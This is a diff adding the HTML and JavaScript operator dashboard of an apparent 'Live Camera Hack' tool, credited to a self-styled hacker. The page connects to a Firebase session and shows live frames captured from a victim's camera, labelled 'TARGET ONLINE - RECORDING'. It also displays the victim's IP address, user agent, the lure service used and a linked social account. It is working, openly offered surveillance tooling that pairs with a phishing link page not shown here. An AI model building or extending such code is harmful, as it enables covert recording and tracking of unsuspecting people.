@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Live Camera Hack</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="config.js"></script>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+        }
+        .dash-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .dash-header {
+            text-align: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #333;
+            margin-bottom: 20px;
+        }
+        .dash-header h1 {
+            margin: 0;
+            color: #ff4444;
+            font-size: 24px;
+        }
+        .dash-header p {
+            color: #888;
+            margin: 5px 0 0;
+            font-size: 13px;
+        }
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #1a1a1a;
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .status-bar .status {
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .status-bar .status.waiting { color: #ffaa00; }
+        .status-bar .status.active { color: #ff0000; }
+        .status-bar .status.completed { color: #666; }
+        .status-bar .ip { color: #0af; font-family: monospace; }
+        .video-wrapper {
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            aspect-ratio: 4/3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            border: 2px solid #333;
+        }
+        .video-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: none;
+        }
+        .video-wrapper .placeholder {
+            color: #444;
+            text-align: center;
+            font-size: 18px;
+        }
+        .video-wrapper .placeholder .icon {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 15px;
+        }
+        .info-panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .info-card {
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 8px;
+        }
+        .info-card h3 {
+            margin: 0 0 8px;
+            color: #888;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .info-card .value {
+            color: white;
+            font-size: 16px;
+            word-break: break-all;
+        }
+        .recording-indicator {
+            display: none;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255,0,0,0.8);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+        .recording-indicator.show { display: block; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .frame-counter {
+            position: absolute;
+            bottom: 15px;
+            left: 15px;
+            background: rgba(0,0,0,0.7);
+            color: #0f0;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-family: monospace;
+        }
+        .no-session {
+            text-align: center;
+            padding: 80px 20px;
+        }
+        .no-session input {
+            padding: 12px 16px;
+            width: 300px;
+            max-width: 90%;
+            border: 2px solid #333;
+            background: #1a1a1a;
+            color: white;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .no-session button {
+            padding: 12px 24px;
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        @media (max-width: 600px) {
+            .info-panel { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="dash-container">
+        <div class="dash-header">
+            <h1>🔴 LIVE CAMERA DASHBOARD</h1>
+            <p>Developer Nawab Zada Hacker ☠️✌️🦅</p>
+        </div>
+
+        <div id="sessionPrompt" class="no-session">
+            <h2>Enter Session ID</h2>
+            <input type="text" id="sessionInput" placeholder="Paste session ID here...">
+            <br>
+            <button onclick="connectSession()">🔗 Connect to Dashboard</button>
+            <p style="color:#666; margin-top:15px; font-size:13px;">Session ID is shown after generating a link on the main page.</p>
+        </div>
+
+        <div id="dashboardContent" style="display:none;">
+            <div class="status-bar">
+                <span class="status waiting" id="statusText">⏳ Waiting for target...</span>
+                <span class="ip" id="ipDisplay">🌐 IP: --</span>
+            </div>
+
+            <div class="video-wrapper">
+                <img id="liveFeed" src="" alt="Camera Feed">
+                <div class="placeholder" id="placeholder">
+                    <span class="icon">📷</span>
+                    Waiting for camera feed...
+                </div>
+                <div class="recording-indicator" id="recordingIndicator">🔴 RECORDING</div>
+                <div class="frame-counter" id="frameCounter">Frames: 0</div>
+            </div>
+
+            <div class="info-panel">
+                <div class="info-card">
+                    <h3>Selected Service</h3>
+                    <div class="value" id="serviceValue">--</div>
+                </div>
+                <div class="info-card">
+                    <h3>Account Link</h3>
+                    <div class="value" id="accountLinkValue">--</div>
+                </div>
+                <div class="info-card">
+                    <h3>Session ID</h3>
+                    <div class="value" id="sessionValue" style="font-family:monospace;font-size:13px;">--</div>
+                </div>
+                <div class="info-card">
+                    <h3>Target User Agent</h3>
+                    <div class="value" id="uaValue" style="font-size:11px;color:#888;">--</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    let currentSessionId = null;
+    let frameListener = null;
+    let metadataListener = null;
+
+    // Check URL for session parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlSession = urlParams.get('session');
+    if (urlSession) {
+        document.getElementById('sessionInput').value = urlSession;
+        connectSession();
+    }
+
+    function connectSession() {
+        const sid = document.getElementById('sessionInput').value.trim();
+        if (!sid) {
+            alert('Please enter a valid Session ID');
+            return;
+        }
+
+        currentSessionId = sid;
+        document.getElementById('sessionPrompt').style.display = 'none';
+        document.getElementById('dashboardContent').style.display = 'block';
+        document.getElementById('sessionValue').textContent = sid;
+
+        // Start monitoring
+        const sessionRef = database.ref('streams/' + sid);
+
+        // Check if session exists
+        sessionRef.once('value', (snapshot) => {
+            if (!snapshot.exists()) {
+                document.getElementById('dashboardContent').innerHTML = '<div style="text-align:center;padding:40px;"><h2>❌ Session not found</h2><p>This session ID does not exist or has expired.</p></div>';
+                return;
+            }
+        });
+
+        // Listen metadata
+        if (metadataListener) metadataListener.off();
+        metadataListener = sessionRef.child('metadata').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (!data) return;
+
+            const statusEl = document.getElementById('statusText');
+            const ipEl = document.getElementById('ipDisplay');
+            
+            if (data.status === 'active') {
+                statusEl.textContent = '🔴 TARGET ONLINE - RECORDING';
+                statusEl.className = 'status active';
+                document.getElementById('recordingIndicator').classList.add('show');
+            } else if (data.status === 'completed') {
+                statusEl.textContent = '⏹️ Session Completed';
+                statusEl.className = 'status completed';
+                document.getElementById('recordingIndicator').classList.remove('show');
+            } else {
+                statusEl.textContent = '⏳ Waiting for target...';
+                statusEl.className = 'status waiting';
+            }
+
+            if (data.targetIp) ipEl.textContent = '🌐 IP: ' + data.targetIp;
+            if (data.service) document.getElementById('serviceValue').textContent = data.service;
+            if (data.socialLink) document.getElementById('accountLinkValue').textContent = data.socialLink;
+            if (data.targetUA) document.getElementById('uaValue').textContent = data.targetUA;
+        });
+
+        // Listen frames
+        if (frameListener) frameListener.off();
+        let frameCount = 0;
+        frameListener = sessionRef.child('frames').on('value', (snapshot) => {
+            const frames = snapshot.val();
+            if (!frames) return;
+
+            const keys = Object.keys(frames).filter(k => k.startsWith('-'));
+            if (keys.length === 0) return;
+
+            keys.sort();
+            const latestKey = keys[keys.length - 1];
+            const latestFrame = frames[latestKey];
+
+            if (latestFrame && latestFrame.data) {
+                const img = document.getElementById('liveFeed');
+                img.src = latestFrame.data;
+                img.style.display = 'block';
+                document.getElementById('placeholder').style.display = 'none';
+                frameCount++;
+                document.getElementById('frameCounter').textContent = 'Frames: ' + frameCount;
+            }
+        });
+    }
+    </script>
+</body>
+</html>
